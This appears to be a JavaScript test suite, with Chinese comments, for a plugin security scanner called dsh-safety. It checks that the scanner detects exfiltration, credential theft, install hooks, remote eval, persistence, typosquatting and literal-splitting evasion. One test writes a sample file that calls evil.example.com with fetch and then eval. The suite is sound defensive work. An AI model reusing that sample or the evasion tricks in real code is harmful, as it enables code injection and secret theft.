/**
 * dsh-safety 端到端测试：对 fixtures 跑真实扫描。
 * 运行：npm run build && node --test test/
 * 断言策略：按 threatId 断言（不绑定具体规则 ID，规则库演进不破坏测试）。
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { scan } from '../dist/index.js';
import { v1Rules } from '../dist/index.js';

const here = dirname(fileURLToPath(import.meta.url));
const fixtures = join(here, '..', 'fixtures');

/** 扫描一个夹具目录，返回报告（fixtures 目录本身会被默认 excludeTests 排除，这里显式关闭） */
async function auditFixture(name) {
  const root = join(fixtures, name);
  return scan({ root, sourceLabel: name, excludeTests: false }, v1Rules);
}

/** 报告中的 threatId 集合 */
function threatIds(report) {
  return new Set(report.findings.map((f) => f.threatId));
}

// ---------------------------------------------------------------- malicious
test('T01 disable-security: patch-disables-security fires', async () => {
  const r = await auditFixture('malicious/disable-security');
  assert.ok(threatIds(r).has('T01'), `expected T01 finding, got: ${[...threatIds(r)]}`);
  assert.ok(r.findings.some((f) => f.severity === 'review'));
});

test('T02 hidden-prompt: zero-width / encoded eval detected', async () => {
  const r = await auditFixture('malicious/hidden-prompt');
  assert.ok(threatIds(r).has('T02'), `expected T02 finding, got: ${[...threatIds(r)]}`);
});

test('T03 install-script: preinstall/postinstall flagged', async () => {
  const r = await auditFixture('malicious/install-script');
  assert.ok(threatIds(r).has('T03'), `expected T03 finding, got: ${[...threatIds(r)]}`);
  const f = r.findings.find((x) => x.threatId === 'T03');
  assert.ok(f && f.evidence.length >= 2, 'install scripts should each carry evidence');
});

test('T04 remote-code: fetch+eval combinator fires', async () => {
  const r = await auditFixture('malicious/remote-code');
  assert.ok(threatIds(r).has('T04'), `expected T04 finding, got: ${[...threatIds(r)]}`);
});

test('T05 exfil: network + sensitive read combinator fires', async () => {
  const r = await auditFixture('malicious/exfil');
  assert.ok(threatIds(r).has('T05'), `expected T05 finding, got: ${[...threatIds(r)]}`);
});

test('T06 credential-steal: credential paths flagged', async () => {
  const r = await auditFixture('malicious/credential-steal');
  assert.ok(threatIds(r).has('T06'), `expected T06 finding, got: ${[...threatIds(r)]}`);
});

// ---------------------------------------------------------------- benign
test('benign ok-plugin: zero review findings', async () => {
  const r = await auditFixture('benign/ok-plugin');
  assert.equal(r.findings.filter((f) => f.severity === 'review').length, 0,
    `ok-plugin must have no review findings: ${JSON.stringify(r.findings)}`);
});

test('benign vision-helper: network without exfil is not review', async () => {
  const r = await auditFixture('benign/vision-helper');
  const review = r.findings.filter((f) => f.severity === 'review');
  assert.equal(review.length, 0, `vision-helper must have no review findings: ${JSON.stringify(review)}`);
  // 但网络能力应被记录在权限画像里
  assert.equal(r.profile.network, true);
  assert.ok(r.profile.outboundHosts.includes('api.vision.example.com'));
});

// ---------------------------------------------------------------- contract
test('contract: audit report is read-only and well-formed', async () => {
  const r = await auditFixture('benign/ok-plugin');
  assert.equal(r.writesPerformed, false);
  assert.equal(typeof r.filesScanned, 'number');
  assert.ok(r.filesScanned >= 1);
  assert.ok(r.ruleSetVersion.length > 0);
  assert.ok(typeof r.durationMs === 'number');
  assert.ok(typeof r.scannedAt === 'string');
});

// ---------------------------------------------------------------- P1 (T07-T11)
test('T07 prompt-inject: hidden instruction detected', async () => {
  const r = await auditFixture('malicious/prompt-inject');
  assert.ok(threatIds(r).has('T07'), `expected T07 finding, got: ${[...threatIds(r)]}`);
});

test('T08 session-hijack: session log read detected', async () => {
  const r = await auditFixture('malicious/session-hijack');
  assert.ok(threatIds(r).has('T08'), `expected T08 finding, got: ${[...threatIds(r)]}`);
});

test('T09 client-phish: fake dialog + keylog detected', async () => {
  const r = await auditFixture('malicious/client-phish');
  assert.ok(threatIds(r).has('T09'), `expected T09 finding, got: ${[...threatIds(r)]}`);
});

test('T10 persistence: rc/scheduled-task write detected', async () => {
  const r = await auditFixture('malicious/persistence');
  assert.ok(threatIds(r).has('T10'), `expected T10 finding, got: ${[...threatIds(r)]}`);
});

test('T11 dns-exfil: dns + sensitive read detected', async () => {
  const r = await auditFixture('malicious/dns-exfil');
  assert.ok(threatIds(r).has('T11'), `expected T11 finding, got: ${[...threatIds(r)]}`);
});

// ---------------------------------------------------------------- adversarial (漏报对抗)
test('adversarial stealth-exfil: keyword split across literals caught via AST fold', async () => {
  // 敏感词被拆成 '.creden'+'tials.yaml'——正则看不到完整 credential，AST 常量折叠可重组
  const r = await auditFixture('malicious/stealth-exfil');
  assert.ok(threatIds(r).has('T06'), `stealth-exfil must be caught by T06, got: ${[...threatIds(r)]}`);
  const t06 = r.findings.filter((f) => f.threatId === 'T06');
  assert.ok(t06.some((f) => f.severity === 'review'), 'T06 must be review via ast:folded-sensitive-path');
  assert.ok(
    t06.some((f) => f.evidence.some((e) => e.pattern === 'ast:folded-sensitive-path')),
    'evidence must come from AST fold',
  );
});

test('adversarial split-payload: chunked base64 + eval caught (T02)', async () => {
  const r = await auditFixture('malicious/split-payload');
  assert.ok(threatIds(r).has('T02'), `split-payload must be caught by T02, got: ${[...threatIds(r)]}`);
});

test('adversarial eval-indirect: eval(variable from Buffer.from decode) caught via AST', async () => {
  const r = await auditFixture('malicious/eval-indirect');
  assert.ok(threatIds(r).has('T02'), `eval-indirect must be caught by T02, got: ${[...threatIds(r)]}`);
  const t02 = r.findings.filter((f) => f.threatId === 'T02');
  assert.ok(
    t02.some((f) => f.evidence.some((e) => e.pattern === 'ast:eval-source')),
    'evidence must come from AST eval-source',
  );
});

// ---------------------------------------------------------------- T14 依赖链
test('T14 supply-chain-poison: known-malicious / typosquat / wide-range detected', async () => {
  const r = await auditFixture('malicious-real/supply-chain-poison');
  assert.ok(threatIds(r).has('T14'), `expected T14 finding, got: ${[...threatIds(r)]}`);
  const t14 = r.findings.filter((f) => f.threatId === 'T14');
  assert.ok(t14.some((f) => f.severity === 'review'), 'T14 must be review');
  const pats = t14.flatMap((f) => f.evidence.map((e) => e.pattern));
  assert.ok(pats.includes('dep-known-malicious'), 'known-malicious evidence expected');
  assert.ok(pats.includes('dep-typosquat'), 'typosquat evidence expected (lodahs/axois)');
});

test('T14 registry-tampering: npmrc registry override + wide range detected', async () => {
  const r = await auditFixture('malicious-real/registry-tampering');
  assert.ok(threatIds(r).has('T14'), `expected T14 finding, got: ${[...threatIds(r)]}`);
  const t14 = r.findings.filter((f) => f.threatId === 'T14');
  assert.ok(t14.some((f) => f.severity === 'review'), 'T14 must be review');
  // .npmrc 应被扫描（dotfile 扩展名处理）
  const npmrcEv = t14.flatMap((f) => f.evidence).filter((e) => e.file.endsWith('.npmrc'));
  assert.ok(npmrcEv.length > 0, '.npmrc registry evidence expected');
});

// ---------------------------------------------------------------- allowlist
test('allowlist: downgrade suppresses review severity but keeps evidence', async () => {
  const root = join(fixtures, 'malicious/install-script');
  // install-script 插件名为 install-script，白名单把它的 T03 降级
  const r = await scan(
    {
      root,
      sourceLabel: 'install-script',
      allowlist: { version: '0.1.0', entries: [{ ruleId: 'T03', plugin: 'install-script', action: 'downgrade', reason: 'test' }] },
      useDefaultAllowlist: false,
    },
    v1Rules,
  );
  const t03 = r.findings.filter((f) => f.threatId === 'T03');
  assert.ok(t03.length > 0, 'downgraded finding should remain with evidence');
  assert.ok(t03.every((f) => f.severity === 'info'), 'downgraded severity must be info');
  assert.equal(r.risk, 'ok', 'no review findings => risk ok');
  assert.ok(r.suppressions && r.suppressions.length > 0, 'suppressions must be recorded');
});

test('allowlist: skip removes the finding entirely', async () => {
  const root = join(fixtures, 'malicious/install-script');
  const r = await scan(
    {
      root,
      sourceLabel: 'install-script',
      allowlist: { version: '0.1.0', entries: [{ ruleId: 'T03', plugin: 'install-script', action: 'skip', reason: 'test' }] },
      useDefaultAllowlist: false,
    },
    v1Rules,
  );
  assert.ok(!threatIds(r).has('T03'), 'skipped rule must not appear');
  const sup = r.suppressions ?? [];
  assert.ok(sup.some((s) => s.ruleId.startsWith('T03') && s.action === 'skip'), 'skip suppression recorded');
});

test('allowlist: default allowlist downgrades harness-pet T03 (real plugin)', async (t) => {
  // 用真实 harness-pet 目录（存在则扫；不存在则跳过——CI 等无本机路径的环境）
  const real = 'C:/Users/gojo/.dsh/profiles/web/node_modules/harness-pet';
  const { access } = await import('node:fs/promises');
  let exists = true;
  try { await access(real); } catch { exists = false; }
  if (!exists) { t.skip('本机未安装 harness-pet，跳过真实插件白名单验证'); return; }
  const r = await scan({ root: real, sourceLabel: 'harness-pet' }, v1Rules);
  const t03 = r.findings.filter((f) => f.threatId === 'T03');
  // 默认白名单将 harness-pet 的 T03 降级为 info
  assert.ok(t03.every((f) => f.severity === 'info'), 'harness-pet T03 should be downgraded by default allowlist');
});

// ---------------------------------------------------------------- excludeTests + plain summary
test('excludeTests: default true skips tests/fixtures dirs', async () => {
  // dsh-plugin-audit 有 tests/ 目录；默认排除后不应命中它的测试夹具
  const real = 'C:/Users/gojo/.dsh/profiles/web/node_modules/harness-pet';
  // 用 fixtures/malicious/exfil 的"tests 内恶意样本"构造：把 malicious/exfil 当普通插件扫，
  // 其中无 tests 目录——改用真实 dsh-plugin-audit 太依赖网络。这里验证语义：
  // 扫描一个含 tests 目录的合成目录（临时在 fixtures 里造一个）
  const { mkdtemp, writeFile, mkdir, rm } = await import('node:fs/promises');
  const { tmpdir } = await import('node:os');
  const dir = await mkdtemp(join(tmpdir(), 'dsh-safety-xtest-'));
  try {
    await mkdir(join(dir, 'tests'), { recursive: true });
    await writeFile(join(dir, 'index.js'), 'export function apply(ctx) {}');
    await writeFile(join(dir, 'tests', 'evil.js'), 'fetch("https://evil.example.com/x"); eval("1")');
    // 默认（排除 tests）→ 0 review
    const r1 = await scan({ root: dir, sourceLabel: 'xtest' }, v1Rules);
    assert.ok(!threatIds(r1).has('T04'), 'tests dir must be excluded by default');
    // 显式不排除 → 命中 T04
    const r2 = await scan({ root: dir, sourceLabel: 'xtest', excludeTests: false }, v1Rules);
    assert.ok(threatIds(r2).has('T04'), 'excludeTests:false must include tests dir');
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('plain summary: renders human-readable conclusion', async () => {
  const { renderPlainSummary } = await import('../dist/index.js');
  const r = await auditFixture('malicious/exfil');
  const plain = renderPlainSummary(r);
  assert.ok(plain.includes('大白话'), 'plain summary should be labeled');
  assert.ok(plain.includes('结论'), 'plain summary should have a verdict');
  assert.ok(plain.includes('T06') || plain.includes('密钥'), 'plain summary should explain threats in plain words');
  // 报告输出结构：MCP/CLI 输出 = 报告 + 白话（验证两者都可用）
  const { renderMarkdown } = await import('../dist/index.js');
  assert.ok(renderMarkdown(r).includes('权限画像'));
});
